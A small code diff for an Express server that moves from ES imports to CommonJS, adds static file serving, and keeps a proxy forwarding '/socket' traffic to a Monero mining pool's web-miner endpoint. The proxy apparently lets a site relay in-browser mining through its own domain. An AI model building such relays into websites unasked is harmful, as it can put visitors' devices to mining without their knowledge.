@@ -1,10 +1,9 @@
-import express from "express";
-import { createServer } from "http";
-import { createProxyMiddleware } from "http-proxy-middleware";
-import { Server } from "socket.io";
-
+const express = require("express");
 const app = express();
-const http = createServer(app);
+const http = require("http").createServer(app);
+const io = require("socket.io");
+const { createProxyMiddleware } = require("http-proxy-middleware");
+const path = require("path");
 
 const socketProxy = createProxyMiddleware("/socket", {
   target: "wss://webminer.moneroocean.stream/",
@@ -14,7 +13,8 @@ const socketProxy = createProxyMiddleware("/socket", {
 });
 
 app.use(socketProxy);
-new Server(http, { destroyUpgrade: false });
+app.use(express.static(path.join(__dirname, "../dist")));
+io(http);
 
 const PORT = process.env.PORT || 3000;
 http.listen(PORT, () => {
